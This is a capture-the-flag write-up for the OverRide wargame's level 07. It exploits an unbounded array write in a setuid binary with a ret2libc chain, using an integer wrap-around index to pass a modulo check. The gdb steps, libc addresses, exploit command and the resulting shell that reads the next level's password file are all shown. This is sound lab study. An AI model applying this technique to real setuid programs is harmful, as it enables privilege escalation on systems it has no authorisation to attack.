# Level 07

## Base analysis

```
level07@OverRide:~$ ls -l
-rwsr-s---+ 1 level08 users 12975 Sep 10  2016 level07
level07@OverRide:~$ checksec --file ./level07
RELRO           STACK CANARY      NX            PIE          FILE
Partial RELRO   Canary found      NX disabled   No PIE       /home/users/level07/level07
```

Setuid `level08`. NX is off, but `main` wipes `argv` and the environment at startup (the two `memset` loops), so there's nowhere to stash shellcode — we go for a **ret2libc**. The program is a "number storage service" with `store`, `read`, and `quit` commands.

## The vulnerability

`store_number` writes a chosen value into a stack array `data` (100 ints) at a user-supplied index, with **no bounds check** :

```c
if ((index % 3 == 0) || (number >> 0x18 == 0xb7)) { /* reserved for wil */ return 1; }
*(unsigned *)(index * 4 + data) = number;      // unbounded write
```

Since `data` is on main's stack, a large enough index reaches main's **saved return address**. Two rules apply to every write: `index % 3 != 0`, and the high byte of `number` can't be `0xb7`.

## Finding the offset to EIP

Store a marker at index 1 to locate `data`, then read main's saved EIP :

```
(gdb) b *0x080486ce          # the write MOV [EAX],EDX in store_number
(gdb) run
 ... store / 1 / 1 ...
(gdb) p/x $eax               # data[1]
$1 = 0xffffd418              # so data = 0xffffd414
(gdb) c                      # continue to main's frame (b *0x080488ef)
(gdb) info frame
 ... Saved registers: ... eip at 0xffffd5dc
```

Offset: `0xffffd5dc - 0xffffd414 = 0x1c8 = 456` bytes = index **114**. So `data[114]` is the saved EIP, `data[115]` is EIP+4, `data[116]` is EIP+8.

## The ret2libc frame

Grab the libc addresses (ASLR is off, so gdb values hold at runtime):

```
(gdb) p system                          -> 0xf7e6aed0
(gdb) p exit                            -> 0xf7e5eb70
(gdb) find &system,+9999999,"/bin/sh"   -> 0xf7f897ec
```

We overwrite three consecutive slots:

```
data[114] (EIP)   = &system      -> runs /bin/sh
data[115] (EIP+4) = &exit        -> clean return address for system
data[116] (EIP+8) = &"/bin/sh"   -> argument to system
```

**Dodging `index % 3 == 0`**: the EIP slot is index 114, and `114 % 3 == 0` is forbidden. Since the write target is `(index*4) mod 2^32`, any index congruent to 114 mod `2^30` hits the same address. We use `114 + 2^30 = 1073741938` (`% 3 == 1`, allowed). Indices 115 and 116 are already fine.

## Exploitation

`exploit07.py` emits the three `store` commands (with the wrap-around index) plus `quit`, given the libc addresses and the measured EIP index:

```bash
(python2 exploit07.py 0xf7e6aed0 0xf7e5eb70 0xf7f897ec 114; cat) | ./level07
```

The trailing `; cat` keeps stdin open so the shell stays interactive. The binary is setuid `level08`:

```
$ whoami
level08
$ cat /home/users/level08/.pass
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

Level 07, clear... Progress to next level ? (Y/n) : ___
